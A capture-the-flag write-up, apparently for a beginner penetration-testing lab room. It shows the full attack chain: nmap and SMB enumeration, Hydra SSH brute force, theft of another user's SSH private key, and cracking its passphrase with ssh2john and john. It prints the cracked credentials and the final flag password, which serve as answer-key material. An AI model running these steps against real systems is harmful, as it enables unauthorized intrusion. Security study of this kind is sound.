# Basic Pen-Testing  Room Writeup
Target Ip Address
```
10.10.142.239
```
## Nmap Scan Report
```
Open Ports and services
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy
```
So there is lots of open Ports so we can enumerate one by one some of these are use to gain initial foothold.

### Web server Enumeration


### Hidden Directory Scan 
```
/development
```
this hidden directory have some text that give us clue about that there are two users one name start with j and other users name start with k and also thwy give us clue one
of the user have weak password.

## SMB Enumeration

Using nmap smb enumeration scripts we found this Smb user shares 
```
| smb-enum-shares: 
|   account_used: guest
|   \10.10.142.239\Anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\anonymous
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \10.10.142.239\IPC$: 
|     Type: STYPE_IPCHIDDEN
|     Comment: IPC Service (Samba Server 4.3.11-Ubuntu)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|    Current user access: READ/WRITE
```
Above Result shows that we have guest user share with anonymouse access.

by Enumerating the smb with nmap smb-users-enum script or metasploit module or some other tecniques we found these valid users.

Using Smb we found Two user 
1) Jan 
2) kay

Now we have valid users so we can use bruteforcing to try to get these users ssh password as they have ssh service open.
In the web server enumeration stage we know one of them have weak password so we can use hydira to bruteforce the user jan to get there password

## Hydira Brutefor Result 
Using Brute force we found valid user password
userName: `jan`
password: `armando`

Now we have jan user password so we ssh to the machine to get the foothold using command 
```
$ ssh jan@10.10.142.239
password armando
```
Now we have the initial access to the system so now we use the other post exploitaion tecniques to get more privileges.
we can use linpeas script to find privilege esclation vectors.
`linpease` show that kay user have ssh private key with the read permission so we can read it and copy all the content of that key to our attacking machine
change the permission of that key only you can read it with the command 
```
$ chmod -600 kay_rsa
```
this will change the permission of the key read/write only for you so now you can ssh to kay user with that key using command
```
$ ssh -i kay_rsa kay@10.10.142.239
```
this will command is use to ssh to that target with private key
Ohh so this key is protected by password so now we have to dig that password also to get ssh to the target
so diging the password we can use sshtojohn script for getting that private key password.
```
$ python ssh2john.py kay_rsa > kay_rsa.hash
```
this will create the hash file of the key and store it to the kay_rsa.hash file
now we use john to crack the hash or to get the password
```
$ john kay_rsa.hash --wordlist=rockyou.txt
```
this will crack the password using the wordlist rockyou.txt

Using Bruteforce with john we found user 2 ssh key password

UserName: `kay`
Password: `beeswax`

so now we have the key password so we can use it to get access to the kay user
```
$ ssh -i kay_rsa kay@10.10.142.239
password beeswax
```
And this is the final password we found after successfully login

```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```
